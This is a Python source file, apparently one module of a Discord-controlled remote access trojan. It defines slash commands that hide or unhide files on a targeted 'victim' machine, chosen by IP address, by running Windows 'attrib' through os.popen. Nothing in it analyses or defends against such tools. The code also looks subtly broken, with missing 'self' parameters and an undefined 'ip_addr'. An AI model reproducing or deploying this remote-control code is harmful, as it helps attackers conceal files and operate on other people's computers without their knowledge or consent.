import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Hide(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(description="Hide file")
    async def hidefile(ctx, victim, file):
        if str(victim) == str(ip_addr): 
            if '"' in file:
                file = file.replace('"','')
            output = os.popen("attrib +h " + '"' + file + '"').read()
            if "not" in output: return await ctx.response.send_message("Unable to hide file. Check path and try again")
            
            await ctx.response.send_message("File hidden successfully")
                        
    @commands.slash_command(description="Unhide file")
    async def unhidefile(ctx, victim, file):
        if str(victim) == str(ip_addr): 
            if '"' in file:
                file = file.replace('"','')
            output = os.popen("attrib -h " + '"' + file + '"').read()
            if "not" in output: return await ctx.response.send_message("Unable to show file. Check path and try again")
            
            await ctx.response.send_message("File unhidden successfully")
            
def setup(bot: commands.Bot):
    bot.add_cog(Hide(bot))